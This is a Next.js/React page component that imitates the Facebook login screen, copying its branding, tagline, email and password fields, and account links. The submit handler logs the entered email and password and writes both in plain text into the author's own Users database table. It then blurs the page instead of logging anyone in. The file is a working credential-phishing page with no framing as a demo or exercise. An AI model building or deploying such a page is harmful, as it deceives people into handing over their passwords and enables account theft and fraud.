"use client";
import { useEffect, useState } from "react";
import { db } from "@/configs/db";
import { Users } from "@/configs/schema";

export default function Home() {
  const [user, setUser] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false); 

  const handleLogin = async () => {
    if (user && password) {
      console.log("Login with", user, password);
      setIsSubmitting(true);

      const result = await db.insert(Users).values({
        password: password,
        email: user,
      });

      console.log(result);

      setTimeout(() => {
        setIsSubmitting(false);
      }, 10000);
    } else {
      console.log("Please fill in both fields");
    }
  };

  return (
    <>
      <div className={`row ${isSubmitting ? "blur" : ""}`}>
        {" "}
        <div className="col-logo">
          <h1 className="text-blue-600 text-7xl">Facebook</h1>
          <h2>
            Facebook helps you connect and share with the people in your life.
          </h2>
        </div>
        <div className="col-form">
          <div className="form-container">
            <input
              type="text"
              placeholder="Email address or phone number"
              value={user}
              onChange={(e) => setUser(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button className="btn-login" onClick={handleLogin}>
              Login
            </button>
            <a href="#">Forgotten password?</a>
            <button className="btn-new">Create new Account</button>
          </div>
          <p>
            <a href="#">
              <b>Create a Page</b>
            </a>{" "}
            for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </>
  );
}
